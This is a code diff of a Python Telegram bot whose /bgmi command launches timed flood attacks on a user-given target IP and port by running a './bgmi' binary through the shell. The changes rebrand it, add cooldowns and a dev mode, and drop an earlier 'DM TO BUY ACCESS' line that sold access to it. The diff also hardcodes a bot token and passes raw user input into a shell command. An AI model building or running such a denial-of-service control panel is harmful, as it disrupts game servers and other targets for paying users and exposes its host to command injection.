@@ -4,8 +4,13 @@ import subprocess
 import datetime
 import os
 
-bgmi_running = False   # ✅ DEFINED HERE (GLOBAL)
-bgmi_process = None    # (needed if you use /stopbgmi)
+# ===== GLOBAL STATE =====
+DEV_MODE = False
+
+bgmi_running = False  # tracks if bgmi is running
+bgmi_process = None   # stores subprocess handle
+bgmi_cooldown = {}    # user_id -> last command time
+COOLDOWN_TIME = 10    # seconds
 
 # insert your Telegram bot token here
 bot = telebot.TeleBot('7844122825:AAGdzw7l_GZ1IL5QAVuUnQNsaGftq-uzYKI')
@@ -282,7 +287,7 @@ def start_attack_reply(message, target, port, duration):
         f"𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n"
         f"𝐏𝐨𝐫𝐭: {port}\n"
         f"𝐓𝐢𝐦𝐞: {duration} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n"
-        f"𝐌𝐞𝐭𝐡𝐨𝐝: VIP - @mesh213 KA KALA JADU"
+        f"𝐌𝐞𝐭𝐡𝐨𝐝: VIP - @shinoj_zakky"
     )
 
     bot.reply_to(message, response)
@@ -292,36 +297,33 @@ bgmi_cooldown = {}
 COOLDOWN_TIME = 10  # seconds
 
 
-# Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
-    user_id = message.from_user.id          # int
-    user_id_str = str(user_id)              # string for file-based users
+    global bgmi_running, bgmi_process   # ✅ MUST BE FIRST LINE
 
-    # Authorization check (admin OR allowed users)
+    user_id = message.from_user.id
+    user_id_str = str(user_id)
+
+    # Authorization check
     if user_id not in admin_id and user_id_str not in allowed_user_ids:
-        bot.reply_to(
-            message,
-            "🚫 Unauthorized Access! 🚫\n\nDM TO BUY ACCESS:- @mesh213"
-        )
+        bot.reply_to(message, "🚫 Unauthorized Access!")
         return
 
-    # Cooldown check (admins bypass)
+    # Cooldown (admins bypass)
     if user_id not in admin_id:
         if user_id in bgmi_cooldown:
             elapsed = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
             if elapsed < COOLDOWN_TIME:
                 bot.reply_to(
                     message,
-                    f"You are on cooldown ❌. Please wait {COOLDOWN_TIME - elapsed} seconds."
+                    f"Cooldown ❌ Wait {COOLDOWN_TIME - elapsed}s"
                 )
                 return
-
         bgmi_cooldown[user_id] = datetime.datetime.now()
 
     command = message.text.split()
     if len(command) != 4:
-        bot.reply_to(message, "✅ Usage :- /bgmi <target> <port> <time>")
+        bot.reply_to(message, "Usage: /bgmi <target> <port> <time>")
         return
 
     target = command[1]
@@ -330,28 +332,29 @@ def handle_bgmi(message):
         port = int(command[2])
         duration = int(command[3])
     except ValueError:
-        bot.reply_to(message, "Port and time must be numbers ❌")
+        bot.reply_to(message, "Port & time must be numbers ❌")
         return
 
     if duration > 600:
-        bot.reply_to(message, "Error: Time must be less than 600 seconds ❌")
+        bot.reply_to(message, "Time must be < 600 ❌")
         return
 
-    # Logging
+    full_command = f"./bgmi {target} {port} {duration} 500"
+
+    # ===== EXECUTION =====
     record_command_logs(user_id, '/bgmi', target, port, duration)
     log_command(user_id, target, port, duration)
-
-    # Start attack reply
     start_attack_reply(message, target, port, duration)
 
-    # Execute command
-    full_command = f"./bgmi {target} {port} {duration} 500"
-    subprocess.run(full_command, shell=True)
+    if DEV_MODE:
+        print("[DEV MODE] Skipped:", full_command)
+        bgmi_running = True
+        bgmi_process = None
+    else:
+        bgmi_process = subprocess.Popen(full_command, shell=True)
+        bgmi_running = True
 
-    bot.reply_to(
-        message,
-        f"✅ BGMI Attack Finished\nTarget: {target}\nPort: {port}\nTime: {duration}"
-    )
+    bot.reply_to(message, "✅ BGMI command executed")
 
 # Add /mylogs command to display logs recorded for bgmi and website commands
 @bot.message_handler(commands=['mylogs'])
@@ -381,14 +384,15 @@ def stop_bgmi(message):
         bot.reply_to(message, "🚫 Unauthorized Access!")
         return
 
-    if not bgmi_running or bgmi_process is None:
+    if not bgmi_running:
         bot.reply_to(message, "ℹ️ bgmi is not running.")
         return
 
-    bgmi_process.terminate()
+    if not DEV_MODE and bgmi_process:
+        bgmi_process.terminate()
+
     bgmi_process = None
     bgmi_running = False
-
     bot.reply_to(message, "🛑 bgmi stopped successfully.")
     
 @bot.message_handler(commands=['help'])
